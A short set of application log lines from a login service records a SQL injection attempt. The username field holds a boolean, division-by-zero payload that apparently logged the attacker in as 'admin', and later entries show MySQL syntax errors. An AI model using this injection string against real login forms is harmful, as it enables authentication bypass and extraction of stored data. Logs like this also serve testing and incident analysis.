+18.12.2024, 09:08:20 [info]: [login] Login successful: username=' OR 1/(SUBSTRING(username, 1, 1) = 'a') -- , sessionID=048eddf0-4d88-4daf-b8d1-9a2db7ac501b
+18.12.2024, 09:08:20 [info]: [validateAndUpdateSession] Session updated successfully: ID=048eddf0-4d88-4daf-b8d1-9a2db7ac501b
+18.12.2024, 09:08:20 [info]: [getUser] Retrieved username: admin for session ID: 048eddf0-4d88-4daf-b8d1-9a2db7ac501b
+18.12.2024, 09:08:38 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') -- '' at line 1
+18.12.2024, 09:08:38 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') -- '' at line 1
